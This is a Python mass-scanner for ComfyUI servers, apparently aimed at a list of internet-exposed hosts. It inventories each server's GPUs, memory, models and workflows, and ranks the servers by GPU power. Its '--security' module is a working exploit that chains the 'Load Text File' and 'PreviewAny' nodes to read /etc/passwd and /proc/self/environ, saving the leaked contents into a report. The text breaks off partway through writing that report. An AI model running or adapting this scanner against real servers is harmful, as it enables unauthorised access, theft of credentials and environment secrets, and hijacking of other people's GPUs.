#!/usr/bin/env python3
"""
ComfyUI 批量扫描 v3.2
流程: 测活+详情一步完成 → 输出md报告
安全: --security 启用任意文件读取漏洞检测 (Load Text File + PreviewAny)
用法: python3 comfyui_scan.py [-f csv] [-w 并发] [-t 超时] [--security]
"""

import argparse, csv, json, os, ssl, socket, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.request import Request, urlopen
from urllib.error import URLError

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DEFAULT_CSV = os.path.join(SCRIPT_DIR, "comfyui.csv")

C_GREEN  = "\033[92m"; C_RED = "\033[91m"; C_YELLOW = "\033[93m"
C_CYAN   = "\033[96m"; C_BOLD = "\033[1m"; C_RESET = "\033[0m"

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

MAX_READ_BYTES = 5 * 1024 * 1024


def fmt_bytes(n):
    n = int(n or 0)
    if not n: return "0"
    for u in ("B","KB","MB","GB"):
        if n < 1024: return f"{n} {u}"
        n //= 1024
    return f"{n} TB"

def fmt_vram(b):
    b = int(b or 0)
    if not b: return "0"
    gb = float(b) / (1024**3)
    if gb < 1: return f"{gb*1024:.0f} MB"
    if gb >= 1024: return f"{gb/1024:.1f} TB"
    return f"{gb:.0f} GB"

def simplify_gpu(gpu):
    if not gpu: return "CPU"
    g = gpu.lower()
    GPU_MAP = [
        ("rtx pro 6000","RTX PRO 6000 BB"),("pro 6000","RTX PRO 6000 BB"),
        ("6000 bb","RTX PRO 6000 BB"),
        ("6000 ada","RTX 6000 Ada"),("5880 ada","RTX 5880 Ada"),
        ("4000 sff","RTX 4000 SFF"),("2000 ada","RTX 2000 Ada"),
        ("2080 ti","RTX 2080 Ti"),
        ("5090","RTX 5090"),("5080","RTX 5080"),
        ("5070 ti","RTX 5070 Ti"),("5070","RTX 5070"),
        ("5060 ti","RTX 5060 Ti"),("5060","RTX 5060"),
        ("4090","RTX 4090"),("4080","RTX 4080"),
        ("4070 ti","RTX 4070 Ti"),("4070","RTX 4070"),
        ("4060 ti","RTX 4060 Ti"),("4060","RTX 4060"),
        ("3090","RTX 3090"),("3080","RTX 3080"),
        ("3070","RTX 3070"),("3060","RTX 3060"),("3050","RTX 3050"),
        ("2080","RTX 2080"),("2070","RTX 2070"),("2060","RTX 2060"),
        ("a6000","RTX A6000"),("a5000","RTX A5000"),
        ("a4000","RTX A4000"),("a2000","RTX A2000"),
        ("quadro rtx 6000","Quadro RTX 6000"),("quadro rtx 5000","Quadro RTX 5000"),
        ("quadro rtx 4000","Quadro RTX 4000"),
        ("b200","B200"),("h200","H200"),("h100","H100"),("h20","H20"),
        ("a100","A100"),("a800","A800"),
        ("a10g","A10G"),("a10","A10"),("a30","A30"),("a40","A40"),
        ("l40s","L40S"),("l40","L40"),("l20","L20"),("l4","L4"),
        ("gb10","GB10"),
        ("tesla v100","Tesla V100"),("v100","Tesla V100"),
        ("tesla p40","Tesla P40"),("p40","Tesla P40"),
        ("tesla p4","Tesla P4"),("p4","Tesla P4"),
        ("tesla t4","Tesla T4"),("t4","Tesla T4"),
        ("rtx 4000","RTX 4000"),("4000","RTX 4000"),
        ("c500","MetaX C500"),("metax","MetaX"),
        ("npu","NPU"),
        ("amd","AMD"),("radeon","AMD"),("rocm","AMD"),
        ("gtx 1080","GTX 1080"),("gtx 1070","GTX 1070"),("gtx 1060","GTX 1060"),
        ("gtx","GTX"),
        ("mps","MPS"),("xpu","Intel Arc"),
    ]
    for token, label in GPU_MAP:
        if token in g: return label
    accel_hints = ("cuda", "npu", "musa", "rocm", "hip", "vulkan", "metal")
    if any(h in g for h in accel_hints):
        return gpu[:40]
    return "CPU"

def short_name(name):
    if not name: return ""
    if isinstance(name, list): name = name[0] if name else ""
    return str(name).replace("\\","/").split("/")[-1]

def parse_err(e):
    s = str(e)
    if "timed out" in s.lower() or "10060" in s or "10061" in s: return "超时"
    if "refused" in s.lower(): return "连接拒绝"
    if "reset" in s.lower(): return "连接被重置"
    return s.split(":")[0].replace("[","").replace("]","").split(" ")[0]

def fetch(url, timeout=6):
    req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
    resp = urlopen(req, timeout=timeout, context=SSL_CTX)
    data = resp.read(MAX_READ_BYTES)
    return resp.status, resp.headers.get("Content-Type",""), data


def load_servers(path):
    servers = []
    with open(path, "r", encoding="utf-8-sig") as f:
        for row in csv.DictReader(f):
            host = (row.get("host") or "").strip()
            if not host: continue
            url = host if host.startswith("http") else f"http://{host}"
            servers.append({"url": url.rstrip("/"), "ip": row.get("ip","").strip(),
                            "port": row.get("port","").strip(), "host": host})
    return servers


def extract_names(field_value):
    names = []
    if not isinstance(field_value, list) or not field_value:
        return names
    first = field_value[0]
    if isinstance(first, list):
        for item in first:
            if isinstance(item, str) and item.strip():
                names.append(item.strip())
    elif isinstance(first, str):
        for item in field_value:
            if isinstance(item, str) and item.strip():
                names.append(item.strip())
    return names


# ComfyUI 内置节点（用于估算自定义节点数）
_COMFYUI_BUILTIN = frozenset({
    # ---- 采样器 ----
    "KSampler", "KSamplerAdvanced", "KSamplerSelect",
    "SamplerCustom", "SamplerCustomAdvanced",
    # ---- CLIP 文本编码 ----
    "CLIPTextEncode", "CLIPTextEncodeSDXL", "CLIPTextEncodeSDXLRefiner",
    "CLIPTextEncodeHunyuanDiT", "CLIPTextEncodeFlux", "CLIPTextEncodePipe",
    "CLIPSetLastLayer",
    # ---- VAE ----
    "VAEDecode", "VAEDecodeTiled", "VAEEncode", "VAEEncodeForInpaint",
    "VAELoader",
    # ---- Checkpoint ----
    "CheckpointLoaderSimple", "CheckpointLoader",
    "UNETLoader", "DiffusionLoader", "DiffusersLoader",
    "unCLIPCheckpointLoader", "ImageOnlyCheckpointLoader",
    # ---- LoRA / ControlNet / Model ----
    "LoraLoader", "LoraLoaderModelOnly",
    "ControlNetLoader", "ControlNetApply", "ControlNetApplyAdvanced",
    "DiffControlNetLoader",
    "CLIPLoader", "DualCLIPLoader", "TripleCLIPLoader", "QuadrupleCLIPLoader",
    "CLIPVisionLoader", "StyleModelLoader", "GLIGENLoader", "HypernetworkLoader",
    "UpscaleModelLoader", "ImageUpscaleWithModel",
    # ---- 图像加载/保存 ----
    "LoadImage", "LoadImageMask", "SaveImage", "PreviewImage",
    "LoadImageFromUrl",
    # ---- Latent ----
    "EmptyLatentImage", "LatentComposite", "LatentBlend",
    "LatentUpscale", "LatentUpscaleBy", "SetLatentNoiseMask",
    "LoadLatent", "SaveLatent",
    # ---- Conditioning ----
    "ConditioningCombine", "ConditioningAverage", "ConditioningConcat",
    "ConditioningSetArea", "ConditioningSetAreaPercentage",
    "ConditioningSetMask", "ConditioningSetTimestepRange",
    "ConditioningZeroOut",
    # ---- 图像处理 ----
    "ImageScale", "ImageScaleBy", "ImageScaleToTotalPixels",
    "ImageCrop", "ImagePadForOutpaint", "ImageBlend",
    "ImageInvert", "ImageColorMatch", "ImageSharpen", "ImageBlur",
    "ImageToMask", "MaskToImage", "SolidMask", "EllipseMask",
    "CropMask", "InvertMask", "GrowMask",
    "ImageFlip", "ImageRotate", "ImageCompositeMasked",
    # ---- 杂项 ----
    "FreeU", "FreeU_V2",
    "Note", "PrimitiveNode", "Reroute",
    "Canny", "MiDaS", "Zoe",
    # ---- Video ----
    "LoadVideo", "VideoLinearCFGGuidance",
    "LoadAudio", "LTXVAudioVAELoader", "LTXAVTextEncoderLoader",
    "AudioEncoderLoader",
})
# 已知内置节点前缀（用于匹配变体）
_COMFYUI_BUILTIN_PREFIXES = (
    "KSampler", "CLIPTextEncode", "VAEDecode", "VAEEncode",
    "CheckpointLoader", "LoraLoader", "CLIPLoader",
    "LoadImage", "SaveImage", "PreviewImage",
    "EmptyLatentImage", "Conditioning", "ControlNet",
    "ImageScale", "ImageCrop", "ImagePad",
    "ImageToMask", "MaskToImage", "SolidMask", "EllipseMask",
    "CropMask", "GrowMask", "InvertMask",
    "LatentUpscale", "LatentBlend", "LatentComposite",
    "ImageBlend", "ImageInvert", "ImageColorMatch",
    "ImageSharpen", "ImageBlur", "ImageFlip",
    "ImageRotate", "ImageCompositeMasked",
    "LoadLatent", "SaveLatent", "LoadImageMask",
    "UNETLoader", "DiffusionLoader", "DiffusersLoader",
    "StyleModelLoader", "GLIGENLoader", "HypernetworkLoader",
    "UpscaleModelLoader",
    "FreeU", "Note", "PrimitiveNode", "Reroute",
)

def _estimate_custom_nodes(base, timeout=5):
    """Manager 不可用时，从 object_info 估算自定义节点数。
    使用流式 key 提取避免全量 JSON 解析（object_info 可达 MB 级）。"""
    import subprocess, re
    try:
        # curl 流式下载，只取前 1MB，超时则用已有数据
        proc = subprocess.run(
            ["curl", "-sk", "--max-time", str(timeout), base + "/object_info"],
            capture_output=True, text=True, timeout=timeout + 2)
        raw = proc.stdout
        if not raw or len(raw) < 10:
            return 0
        # 匹配 value 为 object 且含 "input" 的 key（ComfyUI 节点类型特征）
        # [^}]{0,500} 确保 "input" 出现在值的前500字符内（节点定义的第一属性）
        keys = set(re.findall(
            r'"([A-Za-z][A-Za-z0-9_ /()+\-]+)"\s*:\s*\{[^}]{0,500}"input"', raw))
        # 排除 ComfyUI 节点定义内部的嵌套 key（非节点类型名）
        _NON_NODE_KEYS = {
            "input", "output", "required", "optional", "hidden",
            "default", "min", "max", "step", "round", "name",
            "display_name", "category", "tooltip", "type",
            "forceInput", "multiline", "dynamicPrompts", "lazy",
            "control_after_generate", "image_upload",
            "output_name", "output_is_list", "output_node",
            "description", "python_module", "color",
        }
        keys -= _NON_NODE_KEYS
        if not keys:
            return 0
        custom = 0
        for k in keys:
            if k in _COMFYUI_BUILTIN:
                continue
            if any(k.startswith(p) for p in _COMFYUI_BUILTIN_PREFIXES):
                continue
            custom += 1
        return custom
    except:
        return 0


def check_and_detail(srv, timeout=6, detail_timeout=8):
    """测活 + 详情采集一步完成"""
    base = srv["url"]
    r = {"url":base, "host":srv["host"], "ip":srv["ip"], "port":srv["port"],
         "ok":False, "error":None,
         "comfyui":"", "gpu_raw":"", "gpu_simple":"",
         "gpu_vram_fmt":"", "gpu_free_fmt":"",
         "ram_fmt":"", "ram_free_fmt":"",
         "models":[], "loras":[], "lora_count":0, "clips":[], "vaes":[], "workflows":[],
         "has_history":False, "manager":False, "custom_nodes":0,
         "custom_nodes_estimated":False}

    # ---- 测活（带 1 次重试，防网络抖动误判） ----
    def _try_system_stats(base_url, t):
        """尝试获取 system_stats，支持 1 次重试"""
        for attempt in range(2):
            try:
                s, _, bd = fetch(f"{base_url}/system_stats", t)
                return s, bd
            except Exception as e:
                if attempt == 0 and "timed out" in str(e).lower():
                    time.sleep(1)  # 等 1s 再试
                    continue
                raise
        raise Exception("system_stats timeout after retry")

    try:
        s, bd = _try_system_stats(base, timeout)
        if s == 200:
            data = json.loads(bd)
            sys_info = data.get("system", {})
            ver = sys_info.get("comfyui_version", "")
            if not ver:
                r["error"] = "非ComfyUI"; return r
            r["comfyui"] = ver
            r["ram_fmt"] = fmt_bytes(sys_info.get("ram_total", 0))
            r["ram_free_fmt"] = fmt_bytes(sys_info.get("ram_free", 0))
            devs = data.get("devices", [])
            if devs:
                gpu_dev = None
                for d in devs:
                    name = (d.get("name") or "").lower()
                    dtype = (d.get("type") or "").lower()
                    if dtype != "cpu" and "cpu" not in name:
                        gpu_dev = d; break
                if gpu_dev:
                    # 有真实 GPU
                    raw_name = gpu_dev.get("name", "") or ""
                    r["gpu_raw"] = raw_name
                    r["gpu_simple"] = simplify_gpu(raw_name)
                    gpu_devs = [d for d in devs if (d.get("type") or "").lower() != "cpu"]
                    if not gpu_devs:
                        gpu_devs = [gpu_dev]
                    vram_total = sum(int(d.get("vram_total", 0) or 0) for d in gpu_devs)
                    vram_free = sum(int(d.get("vram_free", 0) or 0) for d in gpu_devs)
                    r["gpu_vram_fmt"] = fmt_vram(vram_total)
                    r["gpu_free_fmt"] = fmt_vram(vram_free)
                else:
                    # CPU-only 系统，不设显存字段
                    r["gpu_simple"] = "CPU"
            else:
                r["gpu_simple"] = "CPU"
        else:
            r["error"] = f"HTTP {s}"; return r
    except Exception as e:
        try:
            s2, _, body = fetch(f"{base}/", timeout)
            html = body.decode("utf-8", errors="replace")
            if s2 != 200 or "comfy" not in html.lower():
                r["error"] = "非ComfyUI"; return r
        except Exception as e2:
            r["error"] = parse_err(e2); return r

    r["ok"] = True

    # ---- 详情采集 ----
    # 快速请求（history/manager/workflows）顺序执行即可
    # 模型/节点查询用小型线程池（3 workers）并行加速，避免单节点最坏 175s 超全局 90s 超时
    def _quick_fetch(path, default=None):
        try:
            s, _, bd = fetch(f"{base}{path}", min(detail_timeout, 5))
            if s == 200:
                data = json.loads(bd)
                return data
        except: pass
        return default

    def _fetch_node_list(nt, fld, timeout=None):
        t = timeout if timeout is not None else min(detail_timeout, 5)
        try:
            s, _, bd = fetch(f"{base}/object_info/{nt}", t)
            if s == 200:
                inp = json.loads(bd).get(nt, {}).get("input", {}).get("required", {})
                return extract_names(inp.get(fld, []))
        except: pass
        return []

    # 历史（快速请求，独立执行）
    hist_data = _quick_fetch("/history?max_items=1", {})
    r["has_history"] = isinstance(hist_data, dict) and len(hist_data) > 0

    # Manager / Workflows（快速请求，独立执行）
    mgr_data = _quick_fetch("/customnode/installed")
    if isinstance(mgr_data, dict):
        r["manager"] = "ComfyUI-Manager" in mgr_data
        r["custom_nodes"] = len(mgr_data)
    else:
        r["manager"] = False
        # Manager 未安装时，从 object_info 估算自定义节点数
        r["custom_nodes"] = _estimate_custom_nodes(base, min(detail_timeout, 10))
        r["custom_nodes_estimated"] = True

    wf_data = _quick_fetch("/api/userdata?dir=workflows")
    if isinstance(wf_data, list):
        r["workflows"] = [str(w) for w in wf_data if isinstance(w, str)]
    else:
        r["workflows"] = []

    # 模型/节点查询 — 用小型线程池并行（3 workers），最坏 ~55s 而不是 ~160s
    MODEL_LOADERS = [
        ("CheckpointLoaderSimple", "ckpt_name"),
        ("UNETLoader", "unet_name"),
        ("CheckpointLoader", "ckpt_name"),
        ("DiffusionLoader", "diffusion_name"),
        ("FluxLoader", "flux_name"),
        ("CLIPTextEncodeFlux", "flux_name"),
        ("WanVideoModelLoader", "model_name"),
        ("QwenImageModelLoader", "model_name"),
        ("LTXVLoader", "model_name"),
        ("HunyuanVideoModelLoader", "model_name"),
        ("Hunyuan3DModelLoader", "model_name"),
        ("Flux2Loader", "flux_name"),
    ]
    ALL_NODE_QUERIES = [(nt, fld) for nt, fld in MODEL_LOADERS] + \
                       [("LoraLoader", "lora_name"), ("LoraLoaderModelOnly", "lora_name"),
                        ("CLIPLoader", "clip_name"), ("VAELoader", "vae_name")]

    node_results = {}  # key: (nt, fld) or special → result
    with ThreadPoolExecutor(max_workers=3) as detail_pool:
        futures_map = {}
        for nt, fld in ALL_NODE_QUERIES:
            futures_map[detail_pool.submit(_fetch_node_list, nt, fld)] = (nt, fld)
        for fut in as_completed(futures_map):
            try:
                node_results[futures_map[fut]] = fut.result(timeout=detail_timeout + 2)
            except:
                node_results[futures_map[fut]] = []

    # 汇总模型
    models_set = set()
    for nt, fld in MODEL_LOADERS:
        for n in (node_results.get((nt, fld), []) or []):
            models_set.add(n)
    r["models"] = sorted(models_set)

    # LoRA
    lora_set = set()
    for key in [("LoraLoader", "lora_name"), ("LoraLoaderModelOnly", "lora_name")]:
        for n in (node_results.get(key, []) or []):
            lora_set.add(n)
    r["lora_count"] = len(lora_set)
    r["loras"] = sorted(lora_set)[:10]

    # CLIP / VAE
    r["clips"] = node_results.get(("CLIPLoader", "clip_name"), []) or []
    r["vaes"]  = node_results.get(("VAELoader", "vae_name"), []) or []

    return r


def print_summary(alive, elapsed):
    print(f"\n{C_BOLD}{'='*90}{C_RESET}")
    print(f"  {C_GREEN}存活: {len(alive)}{C_RESET}    耗时: {elapsed:.0f}s")

    gpu_cnt = {}
    for x in alive:
        k = x["gpu_simple"] or "-"
        gpu_cnt[k] = gpu_cnt.get(k, 0) + 1
    print(f"\n{C_CYAN}── GPU 分布 ──{C_RESET}")
    for k, c in sorted(gpu_cnt.items(), key=lambda kv: -kv[1]):
        print(f"  {k:<28} {c:>4} 台")

    mgr_cnt = sum(1 for x in alive if x.get("manager"))
    print(f"  带管理面板: {C_CYAN}{mgr_cnt}{C_RESET} 台")

    print(f"\n{C_GREEN}── 存活节点 ──{C_RESET}")
    print(f"  {'地址':<46} {'版本':<8} {'GPU':<22} {'显存':>8} {'空闲':>8} {'历史':>4} {'管理':>4} {'节点':>4} {'工作流':>4}  模型  LoRA  {'模型(前2)'}")
    print(f"  {'-'*46} {'-'*8} {'-'*22} {'-'*8} {'-'*8} {'-'*4} {'-'*4} {'-'*4} {'-'*4}  {'-'*4}  {'-'*4}  {'-'*20}")
    for x in alive:
        url = x["url"].replace("http://","").replace("https://","")[:44]
        ver = x["comfyui"] or "?"
        gpu = x["gpu_simple"] or "-"
        vram = x["gpu_vram_fmt"] or "-"
        free = x["gpu_free_fmt"] or "-"
        hist = "✓" if x.get("has_history") else ""
        mgr = "✓" if x.get("manager") else ""
        cn_val = x.get("custom_nodes", 0)
        cn = f"~{cn_val}" if cn_val and x.get("custom_nodes_estimated") else str(cn_val) if cn_val else ""
        nw = str(len(x.get("workflows", []))) if x.get("workflows") else ""
        nm = len(x.get("models", []))
        nl = x.get("lora_count", 0)
        ml = ", ".join(short_name(m) for m in x["models"][:2])
        if len(x["models"]) > 2: ml += f" (+{len(x['models'])-2})"
        print(f"  {C_GREEN}{url:<46}{C_RESET} {ver:<8} {gpu:<22} {vram:>8} {free:>8} {hist:>4} {mgr:>4} {cn:>4} {nw:>4}  {nm:>4}  {nl:>4}   {ml}")


# GPU 排名字典 — O(1) 查找，替代之前的 list.index() O(n)
_GPU_RANK_MAP = {
    "B200": 56, "H200": 55, "H100": 54, "A800": 53, "A100": 52, "H20": 51,
    "RTX PRO 6000 BB": 50, "RTX 6000 Ada": 49, "RTX 5880 Ada": 48,
    "RTX 5090": 47, "L40S": 46, "L40": 45, "RTX A6000": 44,
    "A40": 43, "L20": 42, "RTX 4090": 41, "A30": 40, "RTX 5080": 39,
    "RTX A5000": 38, "RTX 5070 Ti": 37, "RTX 5070": 36,
    "RTX 4080": 35, "A10": 34, "A10G": 33, "RTX 4070 Ti": 32,
    "RTX 5060 Ti": 31, "RTX 5060": 30, "RTX 4070": 29,
    "RTX 4060 Ti": 28, "RTX 4060": 27, "RTX 3090": 26,
    "Quadro RTX 6000": 25, "RTX 4000 SFF": 24, "RTX 4000": 23,
    "Tesla V100": 22, "RTX 3080": 21, "RTX A4000": 20,
    "RTX 3070": 19, "GB10": 18,
    "RTX 3060": 17, "RTX 2080 Ti": 16, "RTX 2080": 15,
    "RTX 3050": 14, "Tesla P40": 13, "L4": 12,
    "RTX 2070": 11, "RTX 2060": 10, "RTX 2000 Ada": 9,
    "Tesla T4": 8, "Tesla P4": 7, "MetaX C500": 6,
    "GTX 1080": 5, "GTX 1070": 4, "GTX 1060": 3, "GTX": 2,
    "NPU": 2, "AMD": 2, "MPS": 1,
    "Intel Arc": 1,
}
def gpu_rank(gpu_simple):
    g = gpu_simple or ""
    rank = _GPU_RANK_MAP.get(g)
    if rank is not None:
        return rank
    if g in ("CPU", "-", "") or not g:
        return 0
    return 1

def write_output(alive):
    def vram_val(x):
        v = x.get("gpu_vram_fmt", "") or ""
        try: return int(v.split()[0]) if v and v[0].isdigit() else 0
        except: return 0
    alive_sorted = sorted(alive, key=lambda x: (vram_val(x), gpu_rank(x.get("gpu_simple", ""))), reverse=True)

    md_out = os.path.join(SCRIPT_DIR, "report.md")
    with open(md_out, "w", encoding="utf-8") as f:
        scan_time = time.strftime("%Y-%m-%d %H:%M:%S")
        f.write("# ComfyUI 存活节点\n\n")
        f.write(f"扫描时间: {scan_time}\n\n")
        f.write(f"共 {len(alive_sorted)} 台\n\n")

        f.write("## 总览\n\n")
        f.write("| # | 地址 | 版本 | GPU | 显存 | 空闲 | 历史 | 管理 | 节点 | 工作流 | 模型数 | LoRA数 |\n")
        f.write("|---|------|------|-----|------|------|------|------|------|--------|--------|--------|\n")
        for i, x in enumerate(alive_sorted, 1):
            raw_url = x["host"]
            # 统一使用 host（含端口），避免 http:// 前缀污染表格
            url_display = raw_url if raw_url else x["url"].replace("http://","").replace("https://","")
            nm = len(x.get("models", []))
            nl = x.get("lora_count", 0)
            hist = "✓" if x.get("has_history") else "-"
            mgr = "✓" if x.get("manager") else "-"
            cn_val = x.get("custom_nodes", 0)
            cn = f"~{cn_val}" if cn_val and x.get("custom_nodes_estimated") else str(cn_val)
            nw = str(len(x.get("workflows", [])))
            # CPU 节点不显示显存（显卡专用指标）
            is_cpu = (x.get("gpu_simple", "") or "").upper() in ("CPU", "")
            vram_disp = "—" if is_cpu else (x.get("gpu_vram_fmt") or "-")
            free_disp = "—" if is_cpu else (x.get("gpu_free_fmt") or "-")
            f.write(f"| {i} | {url_display} | {x['comfyui'] or '?'} | {x['gpu_simple'] or '-'} | "
                    f"{vram_disp} | {free_disp} | "
                    f"{hist} | {mgr} | {cn} | {nw} | {nm} | {nl} |\n")

        f.write("\n---\n\n## 详情\n\n")
        for i, x in enumerate(alive_sorted, 1):
            url = x["host"]
            f.write(f"### {i}. {url}\n\n")
            f.write(f"- **版本**: {x['comfyui'] or '?'}\n")
            f.write(f"- **GPU**: {x['gpu_simple'] or '-'} ({x.get('gpu_raw','') or '-'})\n")
            is_cpu = (x.get("gpu_simple", "") or "").upper() in ("CPU", "")
            if is_cpu:
                f.write(f"- **显存**: — (CPU模式，无独立显存)\n")
            else:
                f.write(f"- **显存**: {x['gpu_vram_fmt'] or '-'} (空闲 {x['gpu_free_fmt'] or '-'})\n")
            f.write(f"- **内存**: {x['ram_fmt'] or '-'} (空闲 {x['ram_free_fmt'] or '-'})\n")
            f.write(f"- **历史**: {'有' if x.get('has_history') else '无'}\n")
            f.write(f"- **管理面板**: {'有' if x.get('manager') else '无'}\n")
            cn_val = x.get("custom_nodes", 0)
            cn_str = f"~{cn_val} (估算，Manager未安装)" if cn_val and x.get("custom_nodes_estimated") else str(cn_val)
            f.write(f"- **自定义节点数**: {cn_str}\n")

            wfs = x.get("workflows", [])
            f.write(f"- **工作流** ({len(wfs)}):")
            if wfs:
                f.write("\n")
                for w in wfs:
                    f.write(f"  - {w}\n")
            else:
                f.write(" 无\n")

            models = x.get("models", [])
            f.write(f"- **模型** ({len(models)}):")
            if models:
                f.write("\n")
                for m in models:
                    f.write(f"  - {short_name(m)}\n")
            else:
                f.write(" 无\n")

            loras = x.get("loras", [])
            lc = x.get("lora_count", 0)
            f.write(f"- **LoRA** ({lc} 个, 前10):")
            if loras:
                f.write("\n")
                for l in loras:
                    f.write(f"  - {short_name(l)}\n")
            else:
                f.write(" 无\n")

            clips = x.get("clips", [])
            if clips:
                f.write(f"- **CLIP**: {', '.join(short_name(c) for c in clips)}\n")

            vaes = x.get("vaes", [])
            if vaes:
                f.write(f"- **VAE**: {', '.join(short_name(v) for v in vaes)}\n")

            f.write("\n")

    return md_out


# ═══════════════════════════════════════════════════════════════════
# 安全检测模块: 任意文件读取 (Load Text File + PreviewAny)
# ═══════════════════════════════════════════════════════════════════

SEC_PROBE_FILES = [
    ("/etc/passwd",           "系统用户"),
    ("/etc/hostname",         "主机名"),
    ("/proc/self/environ",    "进程环境变量"),
    ("/proc/self/cmdline",    "启动命令"),
    ("/etc/resolv.conf",      "DNS配置"),
]

SEC_PROMPT_TEMPLATE = {
    "1": {
        "class_type": "Load Text File",
        "inputs": {
            "file_path": "/etc/passwd",
            "dictionary_name": "sec_test"
        }
    },
    "2": {
        "class_type": "PreviewAny",
        "inputs": {"source": ["1", 0]}
    }
}


def sec_check_node_availability(base, timeout=5):
    """检测节点是否安装了 Load Text File 和 PreviewAny"""
    avail = {"Load Text File": False, "PreviewAny": False}
    for node_type in avail:
        try:
            s, _, bd = fetch(f"{base}/object_info/{node_type}", timeout)
            if s == 200:
                data = json.loads(bd)
                if node_type in data:
                    avail[node_type] = True
        except:
            pass
    return avail


def sec_try_read_file(base, file_path, timeout=10):
    """尝试通过 Load Text File + PreviewAny 读取指定文件
    返回 (success: bool, content: str, prompt_id: str)"""
    prompt = json.loads(json.dumps(SEC_PROMPT_TEMPLATE))
    prompt["1"]["inputs"]["file_path"] = file_path

    # 1) 提交 prompt
    try:
        req = Request(
            f"{base}/prompt",
            data=json.dumps({"prompt": prompt}).encode(),
            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
            method="POST"
        )
        resp = urlopen(req, timeout=timeout, context=SSL_CTX)
        if resp.status != 200:
            return False, f"HTTP {resp.status}", ""
        result = json.loads(resp.read(MAX_READ_BYTES))
        prompt_id = result.get("prompt_id", "")
        if not prompt_id:
            return False, "无prompt_id", ""
    except Exception as e:
        return False, parse_err(e), ""

    # 2) 等待执行完成（轮询 /history/<prompt_id>）
    for _ in range(30):  # 最多等 30s
        time.sleep(1)
        try:
            s, _, bd = fetch(f"{base}/history/{prompt_id}", timeout=5)
            if s == 200 and bd:
                hist = json.loads(bd)
                if prompt_id in hist:
                    outputs = hist[prompt_id].get("outputs", {})
                    # 从 PreviewAny (node 2) 获取输出
                    node2_out = outputs.get("2", {})
                    # 文本输出可能在 text / ui / messages 字段
                    texts = node2_out.get("text", [])
                    if texts and isinstance(texts, list):
                        content = "\n".join(str(t) for t in texts if t)
                        if content.strip():
                            return True, content, prompt_id
                    # 尝试 ui 字段
                    ui = node2_out.get("ui", {})
                    if isinstance(ui, dict):
                        ui_texts = ui.get("text", [])
                        if ui_texts:
                            content = "\n".join(str(t) for t in ui_texts if t)
                            if content.strip():
                                return True, content, prompt_id
                    # 有输出但无文本 → 执行完成但未返回文本
                    return False, "执行完成但无文本输出", prompt_id
        except:
            continue

    return False, "执行超时", prompt_id


def sec_scan_node(srv, timeout=5, read_timeout=10):
    """对单个节点进行安全检测"""
    base = srv["url"]
    result = {
        "url": base, "host": srv["host"],
        "vuln_available": False,
        "vuln_exploitable": False,
        "leaked_files": [],
        "details": []
    }

    # Step 1: 检测节点可用性
    avail = sec_check_node_availability(base, timeout)
    has_ltf = avail["Load Text File"]
    has_pa = avail["PreviewAny"]
    result["load_text_file"] = has_ltf
    result["preview_any"] = has_pa

    if not (has_ltf and has_pa):
        result["skip_reason"] = f"缺少节点: Load Text File={'✓' if has_ltf else '✗'}, PreviewAny={'✓' if has_pa else '✗'}"
        return result

    result["vuln_available"] = True

    # Step 2: 尝试读取 /etc/passwd
    ok, content, pid = sec_try_read_file(base, "/etc/passwd", read_timeout)
    if ok:
        result["vuln_exploitable"] = True
        result["leaked_files"].append({
            "path": "/etc/passwd",
            "desc": "系统用户",
            "content_preview": content[:500]
        })
        result["details"].append(f"/etc/passwd 泄露成功 (prompt_id={pid})")
        # 成功后再尝试读取更多文件
        for fpath, fdesc in SEC_PROBE_FILES[1:]:  # 跳过已读的 /etc/passwd
            ok2, content2, _ = sec_try_read_file(base, fpath, read_timeout)
            if ok2:
                result["leaked_files"].append({
                    "path": fpath,
                    "desc": fdesc,
                    "content_preview": content2[:500]
                })
                result["details"].append(f"{fpath} ({fdesc}) 泄露成功")
            else:
                result["details"].append(f"{fpath} ({fdesc}): {content2}")
    else:
        result["details"].append(f"/etc/passwd 读取失败: {content}")

    return result


def sec_scan(alive_nodes, workers=10, timeout=5, read_timeout=10):
    """对存活节点批量进行安全检测"""
    print(f"\n{C_BOLD}{C_RED}═══ 安全检测: 任意文件读取 (Load Text File + PreviewAny) ═══{C_RESET}")
    print(f"  检测目标: {len(alive_nodes)} 个存活节点\n")

    results = []
    checked = [0]
    vuln_avail = [0]
    vuln_exploit = [0]

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(sec_scan_node, srv, timeout, read_timeout): i
                   for i, srv in enumerate(alive_nodes)}
        for fut in as_completed(futures):
            try:
                r = fut.result(timeout=60)
                results.append(r)
                if r["vuln_available"]:
                    vuln_avail[0] += 1
                if r["vuln_exploitable"]:
                    vuln_exploit[0] += 1
            except:
                pass
            checked[0] += 1
            print(f"\r  [安全检测] {checked[0]}/{len(alive_nodes)}  "
                  f"有漏洞节点 {C_RED}{vuln_avail[0]}{C_RESET}  "
                  f"可利用 {C_RED}{vuln_exploit[0]}{C_RESET}", end="", flush=True)

    print(f"\r  [安全检测] 完成  {checked[0]}/{len(alive_nodes)}  "
          f"有漏洞节点 {C_RED}{vuln_avail[0]}{C_RESET}  "
          f"可利用 {C_RED}{vuln_exploit[0]}{C_RESET}       \n")

    return results


def sec_write_report(sec_results, alive_count):
    """生成安全检测报告"""
    out_path = os.path.join(SCRIPT_DIR, "security_report.md")
    scan_time = time.strftime("%Y-%m-%d %H:%M:%S")

    vuln_avail = [r for r in sec_results if r.get("vuln_available")]
    vuln_exploit = [r for r in sec_results if r.get("vuln_exploitable")]

    with open(out_path, "w", encoding="utf-8") as f:
        f.write("# ComfyUI 安全检测报告\n\n")
        f.write(f"> **检测时间**: {scan_time}\n")
        f.write(f"> **检测范围**: {alive_count} 个存活节点\n")
        f.write(f"> **漏洞类型**: 任意文件读取 (Path Traversal / Arbitrary File Read)\n")
        f.write(f"> **攻击向量**: `Load Text File` + `PreviewAny` 组合节点\n\n")

        f.write("## 概要\n\n")
        f.write(f"| 指标 | 数值 |\n")
        f.write(f"|------|------|\n")
        f.write(f"| 存活节点 | {alive_count} |\n")
        f.write(f"| 安装攻击所需节点 | {len(vuln_avail)} |\n")
        f.write(f"| **可成功利用** | **{len(vuln_exploit)}** |\n")
        f.write(f"| 利用率 | {len(vuln_exploit)/max(len(vuln_avail),1)*100:.1f}% |\n\n")

        f.write("## 漏洞原理\n\n")
